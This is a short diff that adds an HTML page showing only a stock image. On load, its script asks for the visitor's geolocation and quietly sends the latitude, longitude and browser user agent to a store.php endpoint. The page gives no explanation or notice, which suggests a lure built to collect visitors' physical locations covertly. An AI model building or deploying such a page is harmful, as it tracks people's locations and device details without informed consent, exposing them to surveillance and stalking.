@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body onload="getLocation()">
+
+<img src="https://media.istockphoto.com/id/1361855790/photo/abstract-composition-with-connecting-dots-and-lines-blue-background-plexus-effect.jpg?s=1024x1024&w=is&k=20&c=oTQ_cHNDNPzjHs6rFEVS5RcrBDuw2ffgPlSOsbgJooQ=">
+
+
+<script>
+var x = document.getElementById("demo");
+
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+
+function showPosition(position) {
+  const xhttp=new XMLHttpRequest();
+    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
+    xhttp.send();
+}
+</script>
+
+</body>
+</html>
